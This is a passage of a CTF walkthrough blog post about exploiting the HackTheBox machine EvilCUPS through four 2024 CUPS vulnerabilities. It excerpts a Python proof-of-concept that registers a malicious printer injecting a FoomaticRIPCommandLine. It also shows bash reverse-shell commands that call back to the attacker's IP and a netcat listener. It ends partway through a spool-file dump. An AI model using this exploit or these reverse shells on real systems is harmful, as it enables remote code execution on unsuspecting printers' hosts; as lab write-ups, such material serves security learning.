@@ -1,0 +1,932 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: EvilCUPS</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-evilcups">htb-evilcups</a> <a class="post-tag" href="/tags#debian">debian</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#cups">cups</a> <a class="post-tag" href="/tags#cve-2024-47176">cve-2024-47176</a> <a class="post-tag" href="/tags#cve-2024-47076">cve-2024-47076</a> <a class="post-tag" href="/tags#cve-2024-47175">cve-2024-47175</a> <a class="post-tag" href="/tags#cve-2024-47177">cve-2024-47177</a> <a class="post-tag" href="/tags#print-jobs">print-jobs</a> </span><br/><br/>
+<time class="dt-published" datetime="2024-10-02T09:45:00+00:00" itemprop="datePublished">Oct 2, 2024
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2024/10/02/htb-evilcups.html" style="color: #e6e6e6; text-decoration: none;">HTB: EvilCUPS</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/evilcups-cover.webp" type="image/webp"/>
+<img alt="EvilCUPS" class="include_image" loading="lazy" src="/img/evilcups-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>EvilCUPS is all about the recent CUPS exploits that have made a lot of news in September 2024. I’ll abuse the four recent CVEs to get remote code execution on a Linux box through cupsd. In the root step, I’ll find an old print job and recreate the PDF to see it has the root password. In Beyond Root, I’ll look at the PPD file created during the exploit path.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/0 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/evilcups" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">EvilCUPS</a> <a href="https://hackthebox.com/machines/evilcups" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-evilcups.webp" type="image/webp"/> <img alt="EvilCUPS" class="img-av" src="/icons/box-evilcups.png"/></picture></a><br/><a href="https://hackthebox.com/machines/evilcups" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">02 Oct 2024</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">02 Oct 2024</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3769" rel="noopener" target="_blank"><img alt="ippsec" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3769" style="display: unset"/><span class="user-text" style="display: none"> ippsec</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and CUPS (631):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.40
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:24 EDT
+Nmap scan report for 10.10.11.40
+Host is up (0.089s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+631/tcp open  ipp
+
+Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,631 <span class="nt">-sCV</span> 10.10.11.40
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:24 EDT
+Nmap scan report for 10.10.11.40
+Host is up (0.088s latency).
+
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
+|_  256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)
+631/tcp open  ipp     CUPS 2.4
+|_http-title: Home - CUPS 2.4.2
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 80.10 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH version</a>, the host is likely running Debian 12 bookworm.</p>
+<p>Seeing CUPS (Common Unix Printing System), I’ll check UDP as well, and it’s likely open:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-sU</span> <span class="nt">-p</span> 631 10.10.11.40
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:28 EDT
+Nmap scan report for 10.10.11.40
+Host is up (0.090s latency).
+
+PORT    STATE         SERVICE
+631/udp open|filtered ipp
+
+Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
+</span></code></pre></div></div>
+<h3 id="cups---tcp-631">CUPS - TCP 631</h3>
+<p>On TCP, CUPS offers a web GUI to manage printers:</p>
+<picture>
+<source srcset="/img/image-20240930113232598.webp" type="image/webp"/>
+<img alt="image-20240930113232598" class="include_image" loading="lazy" src="/img/image-20240930113232598.png"/>
+</picture>
+<p>It’s running CUPS version 2.4.2, and the Copyright at the bottom shows 2021-2022.</p>
+<p>On the “Printers” tab, there’s one printer installed:</p>
+<picture>
+<source srcset="/img/image-20240930113329149.webp" type="image/webp"/>
+<img alt="image-20240930113329149" class="include_image" loading="lazy" src="/img/image-20240930113329149.png"/>
+</picture>
+<p>The page for the printer shows options for administrating it:</p>
+<picture>
+<source srcset="/img/image-20240930113351935.webp" type="image/webp"/>
+<img alt="image-20240930113351935" class="include_image" loading="lazy" src="/img/image-20240930113351935.png"/>
+</picture>
+<p>At the bottom, there are no active jobs, but there are some completed ones:</p>
+<picture>
+<source srcset="/img/image-20240930131421780.webp" type="image/webp"/>
+<img alt="image-20240930131421780" class="include_image" loading="lazy" src="/img/image-20240930131421780.png"/>
+</picture>
+<p>The page for “Administration” (<code class="language-plaintext highlighter-rouge">/admin</code>) returns 403 Forbidden:</p>
+<picture>
+<source srcset="/img/image-20240930113428324.webp" type="image/webp"/>
+<img alt="image-20240930113428324" class="include_image" loading="lazy" src="/img/image-20240930113428324.png"/>
+</picture>
+<h2 id="shell-as-lp">Shell as lp</h2>
+<h3 id="cups-cves">CUPS CVEs</h3>
+<p>On 26 September 2024 (a bit more than a week before EvilCups released), a researcher who goes by evilsocket released <a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">research about vulnerabilities in CUPs</a>. It includes four CVEs:</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47176">CVE-2024-47176</a> - <code class="language-plaintext highlighter-rouge">cups-browsed</code>, the service that typically listens on all interfaces UDP 631, is what allows adding a printer to a machine remotely. This vulnerability allows any attacker who can reach this machine to trigger a “Get-Printer-Attributes” Internet Printing Protocol (IPP) request being sent to an attacker-controlled URL. This was patched by just disabling <code class="language-plaintext highlighter-rouge">cups-browsed</code> as it’s not really the best way to get this functionality any more.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47076">CVE-2024-47076</a> -  <code class="language-plaintext highlighter-rouge">libcupsfilters</code> is responsible for handling the IPP attributes returned from the request. These are written to a temporary Postscript Printer Description (PPD) file without sanitization, allowing malicious attributes to be written.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47175">CVE-2024-47175</a> - <code class="language-plaintext highlighter-rouge">libppd</code> is responsible for reading a temporary PPD file and turning that into a printer object on the system. It also doesn’t sanitize when reading, allowing for injection of attacker controlled data.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47177">CVE-2024-47177</a> - This vulnerability in <code class="language-plaintext highlighter-rouge">cups-filters</code> allows for loading a printer using the <code class="language-plaintext highlighter-rouge">foomatic-rip</code> print filter, which is a universal converter for transforming PostScript or PDF data into the format that the printer can understand. It has long had issues with command injection, and has been limited to manual installs / configurations only.</li>
+</ul>
+<p>Combining these four vulnerabilities, I can add a malicious printer to a system remotely and then when it prints a page, the vulnerability will trigger and run my command.</p>
+<h3 id="create-evil-printer">Create Evil Printer</h3>
+<h4 id="poc-analysis">POC Analysis</h4>
+<p>The box’s author, IppSec, has a <a href="https://github.com/ippsec/evil-cups">script to exploit this</a> (built from the POCs that are out there already, but with improved stability). The <code class="language-plaintext highlighter-rouge">__main__</code> function gives a good overview of what the script does:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">%s &lt;LOCAL_HOST&gt; &lt;TARGET_HOST&gt; &lt;COMMAND&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="nf">quit</span><span class="p">()</span>
+
+    <span class="n">SERVER_HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="mi">12345</span>
+
+    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+    <span class="n">server</span> <span class="o">=</span> <span class="nc">IPPServer</span><span class="p">((</span><span class="n">SERVER_HOST</span><span class="p">,</span> <span class="n">SERVER_PORT</span><span class="p">),</span>
+                       <span class="n">IPPRequestHandler</span><span class="p">,</span> <span class="nc">MaliciousPrinter</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span>
+        <span class="n">target</span><span class="o">=</span><span class="n">run_server</span><span class="p">,</span>
+        <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="p">)</span>
+    <span class="p">).</span><span class="nf">start</span><span class="p">()</span>
+
+    <span class="n">TARGET_HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">631</span>
+    <span class="nf">send_browsed_packet</span><span class="p">(</span><span class="n">TARGET_HOST</span><span class="p">,</span> <span class="n">TARGET_PORT</span><span class="p">,</span> <span class="n">SERVER_HOST</span><span class="p">,</span> <span class="n">SERVER_PORT</span><span class="p">)</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Please wait this normally takes 30 seconds...</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">seconds</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="si">{</span><span class="n">seconds</span><span class="si">}</span><span class="s"> elapsed</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">""</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">seconds</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre></div></div>
+<p>It starts an IPP server hosting information about a malicious printer. Then it sends a <code class="language-plaintext highlighter-rouge">browsed</code> packet to trigger the request, and</p>
+<p>The <code class="language-plaintext highlighter-rouge">browse</code> packet is built off the specification <a href="https://opensource.apple.com/source/cups/cups-327/cups/doc/help/spec-browsing.html">on opensource.apple.com</a>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_browsed_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ipp_server_host</span><span class="p">,</span> <span class="n">ipp_server_port</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Sending udp packet to </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="c1"># Get a random number between 0 and 100
+</span>    <span class="n">printer_type</span> <span class="o">=</span> <span class="mi">2</span>
+    <span class="n">printer_state</span> <span class="o">=</span> <span class="sh">'</span><span class="s">3</span><span class="sh">'</span>
+    <span class="n">printer_uri</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">http://</span><span class="si">{</span><span class="n">ipp_server_host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">ipp_server_port</span><span class="si">}</span><span class="s">/printers/EVILCUPS</span><span class="sh">'</span>
+    <span class="n">printer_location</span> <span class="o">=</span> <span class="sh">'"</span><span class="s">You Have Been Hacked</span><span class="sh">"'</span>
+    <span class="n">printer_info</span> <span class="o">=</span> <span class="sh">'"</span><span class="s">HACKED</span><span class="sh">"'</span>
+    <span class="n">printer_model</span> <span class="o">=</span> <span class="sh">'"</span><span class="s">HP LaserJet 1020</span><span class="sh">"'</span>
+    <span class="n">packet</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">printer_type</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_state</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_uri</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_location</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_info</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_model</span><span class="si">}</span><span class="s"> </span><span class="se">\n</span><span class="sh">"</span>
+
+    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+    <span class="n">sock</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">packet</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">run_server</span><span class="p">(</span><span class="n">server</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nc">ServerContext</span><span class="p">(</span><span class="n">server</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(.</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+            <span class="k">pass</span>
+
+    <span class="n">server</span><span class="p">.</span><span class="nf">shutdown</span><span class="p">()</span>
+</code></pre></div></div>
+<p>This is sending a UDP packet to the CUPs port to trigger an IPP request back to me.</p>
+<p>The <code class="language-plaintext highlighter-rouge">MaliciousPrinter</code> class is mostly a set of normal attributes except the last one, which is where the injection happens:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">MaliciousPrinter</span><span class="p">(</span><span class="n">behaviour</span><span class="p">.</span><span class="n">StatelessPrinter</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">command</span>
+        <span class="nf">super</span><span class="p">(</span><span class="n">MaliciousPrinter</span><span class="p">,</span> <span class="n">self</span><span class="p">).</span><span class="nf">__init__</span><span class="p">()</span>
+    
+    <span class="k">def</span> <span class="nf">printer_list_attributes</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="c1"># rfc2911 section 4.4
+</span>            <span class="p">(</span>   
+                <span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span>
+                <span class="sa">b</span><span class="sh">'</span><span class="s">printer-uri-supported</span><span class="sh">'</span><span class="p">,</span>
+                <span class="n">TagEnum</span><span class="p">.</span><span class="n">uri</span>
+            <span class="p">):</span> <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">printer_uri</span><span class="p">],</span>
+            <span class="p">(</span>
+            <span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+            <span class="p">(</span>
+                <span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span>
+                <span class="sa">b</span><span class="sh">'</span><span class="s">printer-more-info</span><span class="sh">'</span><span class="p">,</span>
+                <span class="n">TagEnum</span><span class="p">.</span><span class="n">uri</span>
+            <span class="p">):</span> <span class="p">[</span><span class="sa">f</span><span class="sh">'"</span><span class="se">\n</span><span class="s">*FoomaticRIPCommandLine: </span><span class="sh">"</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">command</span><span class="si">}</span><span class="sh">"</span><span class="se">\n</span><span class="s">*cupsFilter2 : </span><span class="sh">"</span><span class="s">application/pdf application/vnd.cups-postscript 0 foomatic-rip</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()],</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+<p>The data starts with a newline, and then adds a <code class="language-plaintext highlighter-rouge">FoomaticRIPCommandLine</code> with the desired command.</p>
+<h4 id="add-printer">Add Printer</h4>
+<p>Typically I liked to test POCs using simple payloads at first. Given that this POC will create a printer that I can’t delete, I’m going to try to just start with a shell. I’ll run the POC, and it sends the UDP packet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python evil-cups.py 10.10.14.6 10.10.11.40 <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"'</span>
+<span class="go">IPP Server Listening on ('10.10.14.6', 12345)
+Sending udp packet to 10.10.11.40:631...
+Please wait this normally takes 30 seconds...
+2 elapsed 
+</span></code></pre></div></div>
+<p>A better shell to send would be <code class="language-plaintext highlighter-rouge">nohup bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"&amp;'</code>, as this will start the shell as a new process in the background. Otherwise, the shell dies every 5-10 minutes when the printer crashes for not being a real printer and gets cleaned up.</p>
+<p>There’s a hang where it says it takes 30 seconds to respond, with a counter. After 29, the target connects and it sends the printer payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">29 elapsed
+target connected, sending payload ...
+
+target connected, sending payload ...
+</span></code></pre></div></div>
+<p>At this point, the printer shows up on the CUPs TCP webserver:</p>
+<picture>
+<source srcset="/img/image-20240930124153109.webp" type="image/webp"/>
+<img alt="image-20240930124153109" class="include_image" loading="lazy" src="/img/image-20240930124153109.png"/>
+</picture>
+<h3 id="trigger-rce">Trigger RCE</h3>
+<p>From the page for the printer, one of the “Maintenance” options is to “Print Test Page”, which I’ll select:</p>
+<picture>
+<source srcset="/img/image-20240930125217779.webp" type="image/webp"/>
+<img alt="image-20240930125217779" class="include_image" loading="lazy" src="/img/image-20240930125217779.png"/>
+</picture>
+<p>As soon as I do, I get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.40 56432
+bash: cannot set terminal process group (1358): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">lp@evilcups:/$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll <a href="https://www.youtube.com/waDtch?v=qE6DxqJg8Q">upgrade my shell</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:/$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">lp@evilcups:/$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">lp@evilcups:/$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll find <code class="language-plaintext highlighter-rouge">user.txt</code> world-readable in <code class="language-plaintext highlighter-rouge">/home/htb/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:/home/htb$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">2a7bfa97************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-directories">Home Directories</h4>
+<p>There is one user on the box, htb:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 4
+drwxrwx--- 3 htb lp 4096 Sep 30 13:04 htb
+</span></code></pre></div></div>
+<p>Interestingly, lp has full access. There’s nothing useful beyond the flag here.</p>
+<p>The same user has a shell set in <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s2">"sh$"</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+htb:x:1000:1000:htb,,,:/home/htb:/bin/bash
+</span></code></pre></div></div>
+<p>The lp user’s home directory is <code class="language-plaintext highlighter-rouge">/var/spool/cups/tmp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:~$</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">/var/spool/cups/tmp
+</span></code></pre></div></div>
+<p>It’s very empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 8
+drwxrwx--T 2 root lp 4096 Sep 30 13:21 .
+drwx--x--- 3 root lp 4096 Sep 30 13:21 ..
+-rw------- 1 lp   lp    0 Sep 30 11:50 cups-dbus-notifier-lockfile
+</span></code></pre></div></div>
+<h4 id="print-jobs">Print Jobs</h4>
+<p>I noted <a href="#cups---tcp-631">above</a> that there were three previous print jobs. <a href="https://www.cups.org/doc/spec-design.html">This CUPS documentation</a> describes the location of “Job Files” as <code class="language-plaintext highlighter-rouge">/var/spool/cups</code>. Unfortunately, lp can’t list this directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:/var/spool$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> cups
+<span class="go">drwx--x--- 3 root lp 4096 Sep 30 13:21 cups
+</span></code></pre></div></div>
+<p>However, the <a href="https://www.cups.org/doc/spec-design.html">same docs</a> show the filename format as <code class="language-plaintext highlighter-rouge">D[5 digit int]-100</code>. I can see if the file associated with a job is there, and it is:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:/var/spool/cups$</span><span class="w"> </span><span class="nb">cat </span>d00001-001
+<span class="go">%!PS-Adobe-3.0
+%%BoundingBox: 18 36 577 806
+%%Title: Enscript Output
+%%Creator: GNU Enscript 1.6.5.90
+%%CreationDate: Sat Sep 28 09:31:01 2024
+%%Orientation: Portrait
+%%Pages: (atend)
+%%DocumentMedia: A4 595 842 0 () ()
+%%DocumentNeededResources: (atend)
+%%EndComments
+%%BeginProlog
+%%BeginResource: procset Enscript-Prolog 1.6.5 90
+%
+% Procedures.
+%
+
+/_S {   % save current state
+  /_s save def
+} def
+/_R {   % restore from saved state
+  _s restore
+} def
+
+/S {    % showpage protecting gstate
+  gsave
+  showpage
+  grestore
+} bind def
+
+/MF {   % fontname newfontname -&gt; -     make a new encoded font
+  /newfontname exch def
+  /fontname exch def
+
+  /fontdict fontname findfont def
+  /newfont fontdict maxlength dict def
+
+  fontdict {
+    exch
+    dup /FID eq {
+      % skip FID pair
+      pop pop
+    } {
+      % copy to the new font dictionary
+      exch newfont 3 1 roll put
+    } ifelse
+  } forall
+
+  newfont /FontName newfontname put
+
+  % insert only valid encoding vectors
+  encoding_vector length 256 eq {
+    newfont /Encoding encoding_vector put
+  } if
+
+  newfontname newfont definefont pop
+} def
+
+/MF_PS { % fontname newfontname -&gt; -    make a new font preserving its enc
+  /newfontname exch def
+  /fontname exch def
+
+  /fontdict fontname findfont def
+  /newfont fontdict maxlength dict def
+
+  fontdict {
+    exch
+    dup /FID eq {
+      % skip FID pair
+      pop pop
+    } {
+      % copy to the new font dictionary
+      exch newfont 3 1 roll put
+    } ifelse
+  } forall
+
+  newfont /FontName newfontname put
+
+  newfontname newfont definefont pop
+} def
+
+/SF { % fontname width height -&gt; -      set a new font
+  /height exch def
+  /width exch def
+
+  findfont
+  [width 0 0 height 0 0] makefont setfont
+} def
+
+/SUF { % fontname width height -&gt; -     set a new user font
+  /height exch def
+  /width exch def
+
+  /F-gs-user-font MF
+  /F-gs-user-font width height SF
+} def
+
+/SUF_PS { % fontname width height -&gt; -  set a new user font preserving its enc
+  /height exch def
+  /width exch def
+
+  /F-gs-user-font MF_PS
+  /F-gs-user-font width height SF
+} def
+
+/M {moveto} bind def
+/s {show} bind def
+
+/Box {  % x y w h -&gt; -                  define box path
+  /d_h exch def /d_w exch def /d_y exch def /d_x exch def
+  d_x d_y  moveto
+  d_w 0 rlineto
+  0 d_h rlineto
+  d_w neg 0 rlineto
+  closepath
+} def
+
+/bgs {  % x y height blskip gray str -&gt; -       show string with bg color
+  /str exch def
+  /gray exch def
+  /blskip exch def
+  /height exch def
+  /y exch def
+  /x exch def
+
+  gsave
+    x y blskip sub str stringwidth pop height Box
+    gray setgray
+    fill
+  grestore
+  x y M str s
+} def
+
+/bgcs { % x y height blskip red green blue str -&gt; -  show string with bg color
+  /str exch def
+  /blue exch def
+  /green exch def
+  /red exch def
+  /blskip exch def
+  /height exch def
+  /y exch def
+  /x exch def
+
+  gsave
+    x y blskip sub str stringwidth pop height Box
+    red green blue setrgbcolor
+    fill
+  grestore
+  x y M str s
+} def
+
+% Highlight bars.
+/highlight_bars {       % nlines lineheight output_y_margin gray -&gt; -
+  gsave
+    setgray
+    /ymarg exch def
+    /lineheight exch def
+    /nlines exch def
+
+    % This 2 is just a magic number to sync highlight lines to text.
+    0 d_header_y ymarg sub 2 sub translate
+
+    /cw d_output_w cols div def
+    /nrows d_output_h ymarg 2 mul sub lineheight div cvi def
+
+    % for each column
+    0 1 cols 1 sub {
+      cw mul /xp exch def
+
+      % for each rows
+      0 1 nrows 1 sub {
+        /rn exch def
